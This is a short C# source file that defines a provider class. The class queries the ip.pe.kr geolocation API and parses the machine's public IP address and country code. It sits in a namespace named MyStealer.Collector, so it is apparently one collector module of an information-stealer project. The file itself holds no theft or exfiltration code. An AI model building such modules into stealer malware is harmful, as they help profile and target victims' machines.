using Newtonsoft.Json.Linq;
using System;
using System.Net;

namespace MyStealer.Collector.Ip
{
    /// <summary>
    /// https://ip.pe.kr/api/
    /// </summary>
    public class IpPeKrProvider : ApiProviderBase
    {
        public override string Name => "ip.pe.kr";

        public override Uri ApiUrl => new Uri("https://api.ip.pe.kr/json/");

        public override IpDetails Parse(string response)
        {
            var obj = JObject.Parse(response);

            return new IpDetails
            {
                Address = IPAddress.Parse(obj["ip"].Value<string>()),
                CountryCode = obj["country_code"].Value<string>(),
                RegionName = "",
                City = ""
            };
        }
    }
}
